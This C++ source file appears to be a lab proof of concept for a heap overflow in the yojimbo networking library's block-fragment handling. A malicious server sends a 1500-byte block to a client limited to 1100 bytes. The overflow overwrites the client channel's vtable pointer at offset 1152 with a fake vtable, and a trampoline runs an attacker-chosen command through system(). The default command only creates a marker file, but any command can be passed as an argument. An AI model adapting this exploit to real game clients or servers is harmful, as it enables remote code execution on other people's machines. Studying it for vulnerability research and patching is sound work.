/*
    W4 lab-only benign-command replay of the yojimbo block-fragment overflow.

    Same split-process layout as split-test.cpp: attacker server (1500/500)
    and victim client (1100/500) are separate processes on 127.0.0.1. The
    crafted final fragment carries, at block offset 1152, the address of a lab
    fake vtable whose entries point to mishe_exec_from_this(), and at offset
    1160 a NUL-terminated lab-chosen command string. The corrupted client
    channel vptr makes the virtual call pass the channel object as `this`;
    the lab trampoline executes this+8 as a command with system().

    The command string is carried in the wire input; only the trampoline is
    pre-placed. All commands are benign lab marker-file creations. Nothing
    contacts an external system.
*/

#include "yojimbo.h"
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <inttypes.h>
#include <unistd.h>

#include "shared.h"
#include "serialize.h"
#include <sodium.h>

using namespace yojimbo;

extern "C" void mishe_exec_from_this( void * p )
{
    const char * command = (const char*) ((uint8_t*) p) + 8;
    printf( "MISHE-R5-CALL command=[%s]\n", command );
    fflush( stdout );
    int rc = system( command );
    printf( "MISHE-R5-RC %d\n", rc );
    fflush( stdout );
}

static void * g_mishe_fake_vtable[4] = {
    (void*) &mishe_exec_from_this,
    (void*) &mishe_exec_from_this,
    (void*) &mishe_exec_from_this,
    (void*) &mishe_exec_from_this
};

static void CheckHandler( const char * condition,
                          const char * function,
                          const char * file,
                          int line )
{
    printf( "check failed: ( %s ), function %s, file %s, line %d\n", condition, function, file, line );
    fflush( stdout );
#ifndef NDEBUG
    __builtin_trap();
#endif
    exit( 1 );
}

#define check( condition )                                                     \
do                                                                             \
{                                                                              \
    if ( !(condition) )                                                        \
        CheckHandler( #condition, __FUNCTION__, __FILE__, __LINE__ );          \
} while(0)

static void run_server( const char * command, bool attack )
{
    Address serverAddress( "127.0.0.1", ServerPort );
    double time = 100.0;

    ClientServerConfig config;
    config.networkSimulator = false;
    config.channel[0].type = CHANNEL_TYPE_RELIABLE_ORDERED;
    config.channel[0].maxBlockSize = 1500;
    config.channel[0].blockFragmentSize = 500;

    uint8_t privateKey[KeyBytes];
    memset( privateKey, 0, KeyBytes );

    Server server( GetDefaultAllocator(), privateKey, serverAddress, config, adapter, time );
    server.Start( 1 );

    printf( "server listening on 127.0.0.1:%d\n", ServerPort );
    fflush( stdout );

    int connected = 0;
    for ( int i = 0; i < 2000; ++i )
    {
        server.SendPackets();
        server.ReceivePackets();
        time += 0.1;
        server.AdvanceTime( time );
        usleep( 1000 );
        if ( server.GetNumConnectedClients() == 1 )
        {
            connected = 1;
            break;
        }
    }
    check( connected );

    printf( "server client connected\n" );
    fflush( stdout );

    const int blockBytes = attack ? 1500 : 1000;
    TestBlockMessage * message = (TestBlockMessage*) server.CreateMessage( 0, TEST_BLOCK_MESSAGE );
    check( message );
    uint8_t * blockData = server.AllocateBlock( 0, blockBytes );
    check( blockData );
    memset( blockData, 0xAB, blockBytes );
    if ( attack )
    {
        uint64_t chosenVptr = (uint64_t) (uintptr_t) &g_mishe_fake_vtable;
        memcpy( blockData + 1152, &chosenVptr, 8 );
        memcpy( blockData + 1160, command, strlen( command ) + 1 );
        printf( "server chosen vptr %016" PRIx64 " command=[%s]\n", chosenVptr, command );
    }
    else
    {
        memcpy( blockData + blockBytes - 11, "MISHE-LOOP", 11 );
    }
    server.AttachBlockToMessage( 0, message, blockData, blockBytes );
    server.SendMessage( 0, 0, message );

    for ( int i = 0; i < 400; ++i )
    {
        server.SendPackets();
        server.ReceivePackets();
        time += 0.1;
        server.AdvanceTime( time );
        usleep( 1000 );
    }

    printf( "server done\n" );
    fflush( stdout );
    server.Stop();
}

static void run_client()
{
    Address clientAddress( "0.0.0.0", ClientPort );
    Address serverAddress( "127.0.0.1", ServerPort );
    double time = 100.0;

    ClientServerConfig config;
    config.networkSimulator = false;
    config.channel[0].type = CHANNEL_TYPE_RELIABLE_ORDERED;
    config.channel[0].maxBlockSize = 1100;
    config.channel[0].blockFragmentSize = 500;

    Client client( GetDefaultAllocator(), clientAddress, config, adapter, time );

    uint8_t privateKey[KeyBytes];
    memset( privateKey, 0, KeyBytes );
    client.InsecureConnect( privateKey, 1, serverAddress );

    printf( "client connecting to 127.0.0.1:%d\n", ServerPort );
    fflush( stdout );

    int connected = 0;
    for ( int i = 0; i < 2000; ++i )
    {
        client.SendPackets();
        client.ReceivePackets();
        time += 0.1;
        client.AdvanceTime( time );
        usleep( 1000 );
        if ( client.IsConnected() )
        {
            connected = 1;
            break;
        }
        if ( client.ConnectionFailed() )
            break;
    }
    check( connected );

    printf( "client connected\n" );
    fflush( stdout );

    for ( int i = 0; i < 400; ++i )
    {
        client.SendPackets();
        client.ReceivePackets();
        time += 0.1;
        client.AdvanceTime( time );
        usleep( 1000 );
    }

    printf( "client done\n" );
    fflush( stdout );
    client.Disconnect();
}

int main( int argc, char ** argv )
{
    check( InitializeYojimbo() );

    if ( argc < 2 )
    {
        printf( "usage: test server|client [attack|safe] [command]\n" );
        return 2;
    }

    const bool isServer = strcmp( argv[1], "server" ) == 0;
    const bool attack = ( argc < 3 ) || ( strcmp( argv[2], "safe" ) != 0 );
    const char * command = ( argc >= 4 ) ? argv[3]
                         : "touch /tmp/yojimbo-r5-established";

    printf( "mode=%s variant=%s fake_vtable=%p\n",
            isServer ? "server" : "client",
            attack ? "attack" : "safe",
            (void*) &g_mishe_fake_vtable );
    fflush( stdout );

    if ( isServer )
        run_server( command, attack );
    else
        run_client();

    ShutdownYojimbo();
    return 0;
}
